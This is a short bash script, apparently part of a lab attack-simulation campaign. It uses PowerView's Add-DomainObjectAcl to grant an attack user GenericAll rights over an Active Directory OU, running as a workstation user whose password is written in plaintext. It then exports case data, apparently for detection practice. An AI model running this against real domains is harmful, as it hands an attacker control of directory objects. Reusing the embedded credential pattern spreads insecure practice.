#!/usr/bin/env bash
# T016 — ACL GenericAll on OU from ws01 (analyst_t1) using PowerView
# Grants GenericAll on Operations OU to attack user.
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB="${SCRIPT_DIR}/../lib"
source "${LIB}/campaign-a-common.sh"

CASE_ID="CADRE-T016-GENERICALL-OU-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)

echo "=== T016 GenericAll on OU | ${CASE_ID} | T0=${T0} ==="

DC02="${DC02:-dc02.child.cadre.local}"
DOMAIN_CHILD="${DOMAIN_CHILD:-child.cadre.local}"
ATTACK_USER="${ATTACK_USER:-analyst_dfir}"
TARGET_OU="OU=Operations,DC=child,DC=cadre,DC=local"

CMD='
$pv = "C:\Tools\cadre-attack\PowerView.ps1";
if (-not (Test-Path $pv)) { throw "PowerView.ps1 not found" }
. $pv;
$ErrorActionPreference = "Stop";
$u = "'''"${DOMAIN_CHILD}\${ATTACK_USER}"'''";
$dn = "'''"${TARGET_OU}"'''";
Add-DomainObjectAcl -Identity $dn -PrincipalIdentity $u -Rights All -DomainController "'''"${DC02}"'''" -Domain "'''"${DOMAIN_CHILD}"'''" -Verbose;
Write-Output "T016_OK: granted GenericAll on OU $dn to $u"
'

ws01_exec_as analyst_t1 'T13r_An@lyst!' "$CMD"

cadre_export "${CASE_ID}" T016 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T016 run complete ==="
